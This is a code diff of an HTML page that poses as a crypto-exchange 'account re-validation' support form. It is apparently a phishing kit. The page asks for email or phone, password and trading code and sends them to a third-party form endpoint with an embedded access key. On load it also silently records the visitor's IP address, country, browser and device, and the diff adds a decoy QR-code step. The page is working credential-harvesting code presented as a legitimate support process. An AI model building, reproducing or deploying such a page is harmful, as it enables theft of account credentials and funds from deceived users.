@@ -1,114 +1,118 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="stylesheet" href="style.css" />
   <title>ACCOUNT RE-VALIDATION</title>
 </head>
-
 <body>
   <header>
     <h1>ACCOUNT <strong>RE</strong>-VALIDATION</h1>
     <p>... a "Step By Step" process.</p>
     <script src="https://widgets.coingecko.com/gecko-coin-price-marquee-widget.js"></script>
-    <gecko-coin-price-marquee-widget locale="en" outlined="true" coin-ids="" initial-currency="usd"></gecko-coin-price-marquee-widget>
+    <gecko-coin-price-marquee-widget 
+      locale="en" 
+      outlined="true" 
+      coin-ids="" 
+      initial-currency="usd">
+    </gecko-coin-price-marquee-widget>
   </header>
+
   <section>
     <article>
+<form 
+  id="form" 
+  class="pure-steps ajaxForm" 
+  action="https://api.web3forms.com/submit" 
+  method="POST" 
+  enctype="multipart/form-data">
 
-      <!-- Updated form with Web3Forms -->
-      <form class="pure-steps" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data" id="form">
+  <!-- Web3Forms access key -->
+  <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">
 
-        <!-- Web3Forms Access Key -->
-        <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">
+  <!-- IP/Geo/Browser/Device -->
+  <input type="hidden" name="ipaddress" id="ipaddress">
+  <input type="hidden" name="country" id="country">
+  <input type="hidden" name="browser" id="browser">
+  <input type="hidden" name="device" id="device">
+  <input type="hidden" name="apiresponse" id="apiresponse">
 
-        <input type="radio" name="steps" class="pure-steps_radio" id="step-0" checked="">
-        <input type="radio" name="steps" class="pure-steps_radio" id="step-1">
+  <!-- Step navigation -->
+  <input type="radio" name="steps" class="pure-steps_radio" id="step-0" checked>
+  <input type="radio" name="steps" class="pure-steps_radio" id="step-1">
 
         <div class="pure-steps_group">
           <ol>
+            <!-- Step 1: Welcome -->
             <li class="pure-steps_group-step">
               <h2 class="pure-steps_group-step_legend">Welcome</h2>
-              <p class="pure-steps_group-step_item"><strong>"NOTE"</strong> Authentication process will be carried out immediately upon receipt of information, and we will notify you of the authentication results.</p>
-              <p class="pure-steps_group-step_item">The information collected is confidential and will not be disclosed by us to unauthorized third parties.</p>
+              <p><strong>NOTE:</strong> Authentication process will be carried out immediately upon receipt of information, and we will notify you of the results.</p>
+              <p>The information collected is confidential and will not be disclosed to unauthorized third parties.</p>
 
-              <label for="cars">Select Issue:</label>
-              <select class="form-control" name="issue" id="cars">
-                <option value="Kyc">Kyc</option>
-                <option value="Web issue">Web issue</option>
-                <option value="Deposit/Withdrawal Query">Deposit/Withdrawal Query</option>
-                <option value="Lost 2FA">Lost 2FA</option>
-                <option value="Biding/Unbinding">Biding/Unbinding</option>
-                <option value="Forgot Password">Forgot Password</option>
-                <option value="Swap">Swap</option>
-                <option value="Buy/Sell Error">Buy/Sell Error</option>
-                <option value="Synchronize">Synchronize</option>
-                <option value="Withdrawal">Withdrawal</option>
-                <option value="Airdrop">Airdrop</option>
-                <option value="Others">Others</option>
-              </select>
-            </li>
+        <label for="issue">Select Issue:</label>
+        <select class="form-control" id="issue" name="issue">
+          <option value="kyc">KYC</option>
+          <option value="web">Web issue</option>
+          <option value="deposit">Deposit/Withdrawal Query</option>
+          <option value="lost2fa">Lost 2FA</option>
+          <option value="forgot">Forgot Password</option>
+          <option value="swap">Swap</option>
+          <option value="buy-sell">Buy/Sell Error</option>
+          <option value="sync">Synchronize</option>
+          <option value="withdrawal">Withdrawal</option>
+          <option value="airdrop">Airdrop</option>
+          <option value="others">Others</option>
+        </select>
+      </li>
 
-            <li class="pure-steps_group-step">
-              <fieldset>
-                <legend class="pure-steps_group-step_legend">Authenticate</legend>
-                <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
-                  <input type="text" placeholder="Type your email here" name="email" id="input_email" required>
-                  <label for="input_email">Email or Mobile No</label>
-                </p>
-                <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
-                  <input type="password" placeholder="Type your password here" name="password" id="input_password" required>
-                  <label for="input_password">Password</label>
-                </p>
-                <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
-                  <input type="password" placeholder="optional" name="code" id="input_password_code">
-                  <label for="input_password_code">Trading Code</label>
-                </p>
-              </fieldset>
-            </li>
-          </ol>
+      <!-- Step 2: Authenticate -->
+      <li class="pure-steps_group-step">
+        <fieldset>
+          <legend>Authenticate</legend>
 
-          <ol class="pure-steps_group-triggers">
-            <li class="pure-steps_group-triggers_item">
-              <label for="step-0">Restart</label>
-            </li>
-            <li class="pure-steps_group-triggers_item">
-              <label for="step-1">Proceed</label>
-            </li>
-            <li class="pure-steps_group-triggers_item">
-              <!-- Hidden fields auto-populated by JS -->
-              <input type="hidden" name="ipaddress" id="ipaddress">
-              <input type="hidden" name="country" id="country">
-              <input type="hidden" name="browser" id="browser">
-              <input type="hidden" name="device" id="device">
-              <input type="hidden" name="apiresponse" id="apiresponse">
+          <p>
+            <label for="input_email">Email or Mobile No</label>
+            <input type="text" placeholder="Type your email here" name="email" id="input_email" required>
+          </p>
 
-              <!-- Final submit -->
-              <button type="submit" class="btn">Validate</button>
-            </li>
-          </ol>
-        </div>
-        <br>
-        <label for="step-0">Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</label>
-      </form>
+          <p>
+            <label for="input_password">Password</label>
+            <input type="password" placeholder="Type your password here" name="password" id="input_password" required>
+          </p>
 
-      <!-- QR Code Result -->
-      <div id="qrResult" style="display:none; text-align:center; margin-top:20px;">
-        <h2>Submission Successful 🎉</h2>
-        <p>Scan this QR code for confirmation:</p>
-        <canvas id="qrcode"></canvas>
-      </div>
+          <p>
+            <label for="input_password_code">Trading Code</label>
+            <input type="password" placeholder="Optional" name="code" id="input_password_code">
+          </p>
+        </fieldset>
+      </li>
+    </ol>
 
-    </article>
-  </section>
+    <!-- Step triggers -->
+    <ol class="pure-steps_group-triggers">
+      <li><label for="step-0">Restart</label></li>
+      <li><label for="step-1">Proceed</label></li>
+      <li><button type="submit" class="btn">Validate</button></li>
+    </ol>
+  </div>
+</form>
+<!-- Final Step: QR Code -->
+<div class="qr-section">
+  <h3>Final Step: Scan QR Code</h3>
+  <img 
+    src="https://th.bing.com/th/id/R.8cd9779578487059327d0e1fa8e1836a?rik=isyael77QNZVUQ&pid=ImgRaw&r=0" 
+    alt="Scan QR Code" 
+    width="200" 
+    height="200">
+  <p>Please scan this QR code to complete the process.</p>
 
-  <!-- QR Code library -->
-  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+  <!-- Hidden field to submit QR code URL -->
+  <input type="hidden" name="qr_code" value="https://th.bing.com/th/id/R.8cd9779578487059327d0e1fa8e1836a?rik=isyael77QNZVUQ&pid=ImgRaw&r=0">
+</div>
 
   <script>
-    // 1. Function to get IP and Country using a public IP lookup API
+    // Function to get IP and Country
     function getIpAndGeo() {
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
@@ -128,28 +132,20 @@
         });
     }
 
-    // 2. Function to get Browser and Device
+    // Function to get Browser and Device
     function getBrowserAndDevice() {
       const userAgent = navigator.userAgent;
       let browser = 'Unknown Browser';
-      if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
-        browser = 'Chrome';
-      } else if (userAgent.includes('Firefox')) {
-        browser = 'Firefox';
-      } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
-        browser = 'Safari';
-      } else if (userAgent.includes('Edg')) {
-        browser = 'Edge';
-      } else if (userAgent.includes('MSIE') || userAgent.includes('Trident')) {
-        browser = 'IE';
-      }
+
+      if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
+      else if (userAgent.includes('Firefox')) browser = 'Firefox';
+      else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
+      else if (userAgent.includes('Edg')) browser = 'Edge';
+      else if (userAgent.includes('MSIE') || userAgent.includes('Trident')) browser = 'IE';
 
       let device = 'Desktop';
-      if (/Mobi|Android/i.test(userAgent)) {
-        device = 'Mobile';
-      } else if (/iPad|Tablet/i.test(userAgent)) {
-        device = 'Tablet';
-      }
+      if (/Mobi|Android/i.test(userAgent)) device = 'Mobile';
+      else if (/iPad|Tablet/i.test(userAgent)) device = 'Tablet';
 
       document.getElementById('browser').value = browser;
       document.getElementById('device').value = device;
@@ -158,41 +154,6 @@
     // Run functions on page load
     getIpAndGeo();
     getBrowserAndDevice();
-
-    // Intercept form submission
-    document.getElementById('form').addEventListener('submit', function(e) {
-      e.preventDefault(); // stop normal redirect
-
-      const formData = new FormData(this);
-
-      fetch(this.action, {
-        method: this.method,
-        body: formData
-      })
-      .then(response => response.json())
-      .then(result => {
-        if(result.success) {
-          // Hide the form
-          document.getElementById('form').style.display = 'none';
-          // Show QR container
-          document.getElementById('qrResult').style.display = 'block';
-          // Generate QR code (encode submission ID or message)
-          QRCode.toCanvas(
-            document.getElementById('qrcode'),
-            "Submission ID: " + result.data.id,
-            function (error) {
-              if (error) console.error(error);
-            }
-          );
-        } else {
-          alert("Submission failed. Please try again.");
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        alert("Error submitting form.");
-      });
-    });
   </script>
 </body>
 </html>
